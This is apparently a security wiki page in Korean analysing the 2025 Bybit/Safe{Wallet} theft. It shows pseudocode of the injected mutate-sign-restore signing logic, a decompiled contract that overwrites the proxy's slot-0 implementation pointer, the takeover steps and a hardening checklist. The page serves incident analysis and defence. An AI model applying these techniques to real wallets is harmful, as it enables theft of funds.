# Web3 Signing Workflow Compromise & Safe Delegatecall Proxy Takeover

{{#include ../../banners/hacktricks-training.md}}

## 개요

콜드 월렛 탈취 chain은 **Safe{Wallet} web UI의 supply-chain compromise**와 **proxy의 implementation pointer(slot 0)를 덮어쓴 on-chain delegatecall primitive**를 결합했습니다. 핵심 내용은 다음과 같습니다.

- dApp이 signing path에 code를 inject할 수 있다면, signer가 **attacker가 선택한 fields에 대한 유효한 EIP-712 signature**를 생성하도록 만든 뒤 다른 signer들이 알아차리지 못하도록 원래 UI data를 복원할 수 있습니다.<sup>[[1]](#references)[[3]](#references)[[4]](#references)</sup>
- Safe proxies는 `masterCopy`(implementation)를 **storage slot 0**에 저장합니다. slot 0에 쓰는 contract로 delegatecall을 수행하면 사실상 Safe가 attacker logic으로 “업그레이드”되어 wallet을 완전히 제어할 수 있습니다.<sup>[[3]](#references)</sup>

## Off-chain: Safe{Wallet}에서의 Targeted signing mutation

변조된 Safe bundle(`_app-*.js`)은 특정 Safe + signer addresses를 선택적으로 공격했습니다. Inject된 logic은 signing call 직전에 실행되었습니다.<sup>[[1]](#references)[[3]](#references)</sup>
```javascript
// Pseudocode of the malicious flow
orig = structuredClone(tx.data);
if (isVictimSafe && isVictimSigner && tx.data.operation === 0) {
tx.data.to = attackerContract;
tx.data.data = "0xa9059cbb...";      // ERC-20 transfer selector
tx.data.operation = 1;                 // delegatecall
tx.data.value = 0;
tx.data.safeTxGas = 45746;
const sig = await sdk.signTransaction(tx, safeVersion);
sig.data = orig;                       // restore original before submission
tx.data = orig;
return sig;
}
```
### 공격 특성
- **Context-gated**: victim Safe/signer에 대한 하드코딩된 allowlist가 noise를 방지하고 탐지 가능성을 낮췄다.<sup>[[1]](#references)[[3]](#references)</sup>
- **Last-moment mutation**: `signTransaction` 직전에 fields (`to`, `data`, `operation`, gas)를 덮어쓴 다음 되돌렸기 때문에, UI의 proposal payload는 무해해 보였지만 signature는 attacker payload와 일치했다.<sup>[[3]](#references)</sup>
- **EIP-712 opacity**: wallets는 structured data를 표시했지만 nested calldata를 decode하거나 `operation = delegatecall`을 강조하지 않아, 변조된 message는 사실상 blind-signed되었다.<sup>[[3]](#references)[[4]](#references)</sup>

### Gateway validation relevance
Safe proposal은 **Safe Client Gateway**로 제출된다.<sup>[[5]](#references)</sup> Hardened checks가 적용되기 전에는 UI가 signing 후 값을 다시 작성할 경우, JSON body의 fields와 다른 `safeTxHash`/signature에 해당하는 proposal을 gateway가 수락할 수 있었다. Incident 이후 gateway는 hash/signature가 제출된 transaction과 일치하지 않는 proposal을 거부한다.<sup>[[3]](#references)</sup> 유사한 server-side hash verification은 모든 signing-orchestration API에서 강제되어야 한다.

### 2025 Bybit/Safe incident highlights
- 2025년 2월 21일 Bybit cold-wallet drain (~401k ETH)은 동일한 pattern을 재사용했다. Compromised Safe S3 bundle은 Bybit signer에 대해서만 trigger되었고, `operation=0` → `1`로 바꾼 뒤 slot 0을 write하는 pre-deployed attacker contract를 `to`로 지정했다.<sup>[[1]](#references)[[3]](#references)</sup>
- Wayback-cached `_app-52c9031bfa03da47.js`는 Bybit의 Safe (`0x1db9…cf4`)와 signer addresses를 기준으로 logic을 실행한 다음, execution 2분 후 clean bundle로 즉시 rollback했으며, 이는 “mutate → sign → restore” trick을 그대로 보여준다.<sup>[[1]](#references)[[2]](#references)</sup>
- Malicious contract (예: `0x9622…c7242`)에는 단순한 `sweepETH/sweepERC20` functions와 implementation slot을 write하는 `transfer(address,uint256)`가 포함되어 있었다. `execTransaction(..., operation=1, to=contract, data=transfer(newImpl,0))`를 실행하면 proxy implementation이 변경되고 full control이 부여되었다.<sup>[[1]](#references)[[3]](#references)</sup>

## On-chain: Delegatecall proxy takeover via slot collision

Safe proxy는 **storage slot 0**에 `masterCopy`를 유지하고 모든 logic을 해당 주소로 delegate한다. Safe는 **`operation = 1` (delegatecall)**을 지원하므로, 서명된 모든 transaction은 임의의 contract를 지정하고 proxy의 storage context에서 해당 contract의 code를 실행할 수 있다.<sup>[[3]](#references)</sup>

Attacker contract는 ERC-20 `transfer(address,uint256)`를 모방했지만, 대신 `_to`를 slot 0에 write했다:<sup>[[1]](#references)[[3]](#references)</sup>
```solidity
// Decompiler view (storage slot 0 write)
uint256 stor0; // slot 0
function transfer(address _to, uint256 _value) external {
stor0 = uint256(uint160(_to));
}
```
실행 경로:<sup>[[1]](#references)[[3]](#references)</sup>
1. 피해자들은 `operation = delegatecall`, `to = attackerContract`, `data = transfer(newImpl, 0)`으로 `execTransaction`에 서명합니다.
2. Safe masterCopy는 이러한 매개변수에 대한 서명을 검증합니다.
3. Proxy는 `attackerContract`로 delegatecall을 수행하고, `transfer` 본문은 slot 0에 값을 기록합니다.
4. 이제 slot 0(`masterCopy`)은 공격자가 제어하는 로직을 가리키게 되어 → **지갑 완전 장악 및 자금 탈취**가 발생합니다.

### Guard 및 버전 참고 사항 (사건 후 강화)
- Transaction guards는 Safe v1.3.0에서 도입되었으며, 실행 전에 모든 `execTransaction` 매개변수를 검사할 수 있습니다. Guard는 `delegatecall`을 거부하거나 대상 및 calldata에 대한 정책을 적용할 수 있습니다. Bybit은 이 hook이 도입되기 전 버전인 v1.1.1을 사용했습니다.<sup>[[2]](#references)[[6]](#references)</sup>

## Detection 및 hardening checklist

- **UI 무결성**: JS assets / SRI를 고정하고, bundle diff를 모니터링하며, signing UI를 trust boundary의 일부로 취급합니다.
- **서명 시 검증**: **EIP-712 clear-signing**을 지원하는 hardware wallets를 사용하고, `operation`을 명시적으로 표시하며 중첩된 calldata를 decode합니다. 정책에서 허용하지 않는 한 `operation = 1`일 때는 서명을 거부합니다.<sup>[[3]](#references)</sup>
- **서버 측 hash 검사**: 제안을 relay하는 gateways/services는 `safeTxHash`를 다시 계산하고 서명이 제출된 필드와 일치하는지 검증해야 합니다.<sup>[[3]](#references)</sup>
- **정책/allowlists**: `to`, selectors, asset types에 대한 preflight rules를 적용하고, 검증된 flow를 제외한 delegatecall을 금지합니다. 완전히 서명된 transactions를 broadcast하기 전에 내부 policy service를 거치도록 요구합니다.
- **Contract design**: 엄격히 필요한 경우가 아니라면 multisig/treasury wallets에서 임의의 delegatecall을 노출하지 않습니다. 모든 implementation pointer를 upgrade primitive로 취급하고, 명시적인 access control로 보호하며, delegatecall targets/selectors에 Guard를 적용합니다. pointer를 다른 slot으로 옮기는 것만으로는 완전한 방어가 되지 않습니다.<sup>[[3]](#references)[[6]](#references)</sup>
- **Monitoring**: treasury funds를 보유한 wallets에서 delegatecall executions가 발생하거나, 일반적인 `call` patterns에서 `operation`을 변경하는 proposals가 생성될 때 alert를 발생시킵니다.

## References

- [1] [Bybit Safe exploit에 대한 AnChain.AI의 forensic 분석](https://www.anchain.ai/blog/bybit)
- [2] [Safe bundle compromise에 대한 Zero Hour Technology의 분석](https://www.panewslab.com/en/articles/7r34t0qk9a15)
- [3] [Bybit hack에 대한 심층 technical analysis (NCC Group)](https://www.nccgroup.com/research-blog/in-depth-technical-analysis-of-the-bybit-hack/)
- [4] [EIP-712](https://eips.ethereum.org/EIPS/eip-712)
- [5] [safe-client-gateway (GitHub)](https://github.com/safe-global/safe-client-gateway)
- [6] [Safe smart account v1.3.0 changelog (GitHub)](https://github.com/safe-fndn/safe-smart-account/blob/main/CHANGELOG.md)
{{#include ../../banners/hacktricks-training.md}}
